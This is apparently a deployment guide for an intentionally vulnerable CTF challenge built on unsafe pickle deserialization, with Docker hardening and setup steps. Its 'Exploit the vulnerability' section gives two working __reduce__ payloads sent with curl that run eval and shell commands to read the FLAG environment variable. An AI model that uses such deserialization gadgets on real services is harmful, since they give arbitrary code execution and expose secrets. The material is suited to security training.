# Modal CTF - Docker Deployment Guide

## Overview
This CTF challenge demonstrates an unsafe pickle deserialization vulnerability in modal-client. The application is containerized with extensive security hardening to prevent container escape.

## Security Features

### Container Security
- **Non-root user**: Runs as uid=1001 (ctfuser) with no shell access
- **Read-only filesystem**: Container filesystem is read-only with limited tmpfs mounts
- **Capability dropping**: All Linux capabilities dropped except NET_BIND_SERVICE
- **No privilege escalation**: `no-new-privileges` flag prevents any privilege escalation
- **AppArmor/Seccomp**: Security profiles enabled for syscall filtering
- **Resource limits**: CPU (0.5 cores), Memory (256MB), PIDs (50), file descriptors (1024)
- **No setuid binaries**: All setuid/setgid bits removed from container
- **Multi-stage build**: Minimal final image with only necessary components

### Network Security
- Single port exposure (8080 internal, mapped to 80 external)
- Network access blocked in Modal function execution

## Quick Start

### Prerequisites
- Docker installed and running
- Modal API tokens (MODAL_TOKEN_ID and MODAL_TOKEN_SECRET)
- Root access (for port 80) or use port 8080

### Method 1: Using the startup script (Recommended)

```bash
# Set your flag
export FLAG='CTF{your_secret_flag_here}'

# Set Modal tokens
export MODAL_TOKEN_ID='your_modal_token_id'
export MODAL_TOKEN_SECRET='your_modal_token_secret'

# Run with root for port 80
sudo -E ./docker_start.sh

# Or modify docker_start.sh to use HOST_PORT=8080 for non-root
```

### Method 2: Using Docker Compose

```bash
# Create .env file
cat > .env <<EOF
FLAG=CTF{your_secret_flag_here}
MODAL_TOKEN_ID=your_modal_token_id
MODAL_TOKEN_SECRET=your_modal_token_secret
HOST_PORT=80
EOF

# Start the container
sudo docker-compose up -d

# View logs
sudo docker-compose logs -f

# Stop the container
sudo docker-compose down
```

### Method 3: Manual Docker commands

```bash
# Build image
docker build -t modal-ctf:secure .

# Run with all security features
docker run \
    --name modal-ctf \
    --detach \
    --restart unless-stopped \
    --publish 80:8080 \
    --env FLAG="CTF{your_flag}" \
    --env MODAL_TOKEN_ID="$MODAL_TOKEN_ID" \
    --env MODAL_TOKEN_SECRET="$MODAL_TOKEN_SECRET" \
    --read-only \
    --tmpfs /tmp:noexec,nosuid,nodev,size=10M \
    --security-opt no-new-privileges \
    --security-opt apparmor=docker-default \
    --cap-drop ALL \
    --cap-add NET_BIND_SERVICE \
    --memory="256m" \
    --cpus="0.5" \
    --pids-limit 50 \
    modal-ctf:secure
```

## Container Management

### View status
```bash
docker ps -f name=modal-ctf
```

### View logs
```bash
docker logs -f modal-ctf
```

### Stop container
```bash
docker stop modal-ctf
```

### Remove container
```bash
docker rm modal-ctf
```

### Health check
```bash
curl http://localhost/health
```

## Testing the CTF

### 1. Access the web interface
Open http://localhost in your browser

### 2. Test basic execution
```bash
curl -X POST http://localhost/execute --data-binary 'print("Hello"); 42'
```

### 3. Exploit the vulnerability

The working exploits (both capture the FLAG value):

**Multi-line class definition:**
```bash
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))

FlagExploit()
EOF
```

**One-liner alternative:**
```bash
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
EOF
```

## Security Considerations

### What's Protected
- Container escape via privilege escalation (no-new-privileges, non-root user)
- Kernel exploits (AppArmor, Seccomp profiles)
- Resource exhaustion (CPU, memory, PID limits)
- Filesystem persistence (read-only root filesystem)
- Binary exploitation (no setuid/setgid binaries)
- Capability-based attacks (all capabilities dropped except networking)

### What's Intentionally Vulnerable
- Pickle deserialization in the application logic (by design for CTF)
- The FLAG environment variable is accessible to the application

### Additional Hardening (Optional)
For production systems (not CTF), consider:
- Using gVisor or Kata Containers for additional isolation
- Running on a dedicated VM with SELinux/AppArmor
- Network segmentation and firewall rules
- Regular security updates and vulnerability scanning
- Audit logging and monitoring

## Troubleshooting

### Permission denied on port 80
- Run with sudo: `sudo -E ./docker_start.sh`
- Or change to port 8080 in docker_start.sh

### Modal token issues
- Ensure MODAL_TOKEN_ID and MODAL_TOKEN_SECRET are set
- Verify tokens are valid with: `modal token validate`

### Container won't start
- Check logs: `docker logs modal-ctf`
- Verify no other service is using port 80
- Ensure Docker daemon is running

### Health check failing
- Check Modal function is deployed: `modal app list`
- Verify network connectivity
- Check container logs for errors

## Development

### Rebuild image
```bash
docker build --no-cache -t modal-ctf:secure .
```

### Run in development mode (with shell access)
```bash
docker run -it --rm \
    --env FLAG="CTF{test}" \
    --env MODAL_TOKEN_ID="$MODAL_TOKEN_ID" \
    --env MODAL_TOKEN_SECRET="$MODAL_TOKEN_SECRET" \
    --entrypoint /bin/bash \
    modal-ctf:secure
```

### View container security settings
```bash
docker inspect modal-ctf | jq '.[0].HostConfig.SecurityOpt'
docker inspect modal-ctf | jq '.[0].HostConfig.CapDrop'
```

## License
This is an intentionally vulnerable application for CTF/educational purposes only.
Do not use in production environments.
